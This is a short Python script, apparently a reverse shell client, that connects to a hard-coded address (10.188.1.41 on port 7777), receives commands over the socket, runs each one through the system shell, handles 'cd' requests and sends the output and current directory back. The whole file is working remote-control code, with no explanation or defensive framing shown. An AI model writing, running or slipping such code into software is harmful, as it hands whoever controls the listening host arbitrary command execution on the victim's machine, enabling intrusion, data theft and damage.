import socket
import os
import subprocess


s = socket.socket()

host = "10.188.1.41"
port = 7777



s.connect((host,port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))

    if len(data)>0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr = subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        curr_dir = os.getcwd() + ">"
        s.send(str.encode(output_str + curr_dir))

        print(output_str)

